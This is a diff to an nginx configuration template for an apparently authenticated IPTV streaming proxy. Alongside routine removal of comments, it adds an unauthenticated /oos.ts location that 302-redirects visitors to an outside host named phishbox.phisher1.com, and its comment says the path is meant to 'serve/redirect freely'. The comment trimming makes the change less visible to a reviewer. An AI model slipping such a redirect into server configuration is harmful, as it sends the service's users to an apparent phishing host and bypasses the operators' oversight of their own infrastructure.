@@ -30,7 +30,7 @@ server {
     access_log /var/log/nginx/yiafe_access.log;
     error_log  /var/log/nginx/yiafe_error.log;
 
-    # If auth_request returns 401/403, come here; 403 may carry X-Redirect (live off → /oos.ts or your external URL)
+    # If auth_request returns 401/403, handle here (may carry redirect hint)
     error_page 401 403 = @auth_fail;
 
     {% if role_iptvservice__enable_ua_filter | bool %}
@@ -44,6 +44,12 @@ server {
     }
     {% endfor %}
 
+    # === NO-AUTH OOS CLIP (exact match) ===
+    location = /oos.ts {
+        # no auth_request here; serve/redirect freely
+        return 302 https://phishbox.phisher1.com/oos.ts;
+    }
+
     # Internal auth endpoint
     location = /_auth {
         internal;
@@ -55,7 +61,7 @@ server {
         proxy_set_header X-Q-Pass     $saved_pass;
         proxy_set_header X-Path-User  $path_user;
         proxy_set_header X-Orig-Args  $saved_args;
-        proxy_set_header X-Req-URI    $request_uri;   # lets app know if this was /live/...ts
+        proxy_set_header X-Req-URI    $request_uri;
 
         proxy_pass_request_body off;
         proxy_set_header Content-Length "";
@@ -76,7 +82,7 @@ server {
         auth_request_set $proxy_pass    $upstream_http_x_proxy_pass;
         auth_request_set $display_user  $upstream_http_x_display_user;
         auth_request_set $display_pass  $upstream_http_x_display_pass;
-        auth_request_set $auth_redirect $upstream_http_x_redirect;   # NEW: capture redirect hint
+        auth_request_set $auth_redirect $upstream_http_x_redirect;
 
         proxy_pass $backend/$1/$proxy_user/$proxy_pass/$4;
 
@@ -119,7 +125,7 @@ server {
         auth_request_set $basic         $upstream_http_x_basic;
         auth_request_set $proxy_user    $upstream_http_x_proxy_user;
         auth_request_set $proxy_pass    $upstream_http_x_proxy_pass;
-        auth_request_set $auth_redirect $upstream_http_x_redirect;   # NEW
+        auth_request_set $auth_redirect $upstream_http_x_redirect;
 
         proxy_pass $backend/$1/$proxy_user/$proxy_pass/$4;
 
@@ -160,7 +166,7 @@ server {
         auth_request_set $display_user  $upstream_http_x_display_user;
         auth_request_set $display_pass  $upstream_http_x_display_pass;
         auth_request_set $desired_ext   $upstream_http_x_desired_ext;
-        auth_request_set $auth_redirect $upstream_http_x_redirect;   # NEW
+        auth_request_set $auth_redirect $upstream_http_x_redirect;
 
         proxy_pass $backend$api_uri_stripped?$fwd_args;
 
@@ -206,11 +212,9 @@ server {
         send_timeout 1h;
     }
 
-    # Auth failure handler: turn app’s 403 + X-Redirect into a 302
+    # Auth failure handler: if app says where to go, 302 there; else 401
     location @auth_fail {
-        if ($auth_redirect != "") {
-            return 302 $auth_redirect;
-        }
+        if ($auth_redirect != "") { return 302 $auth_redirect; }
         return 401;
     }
 }
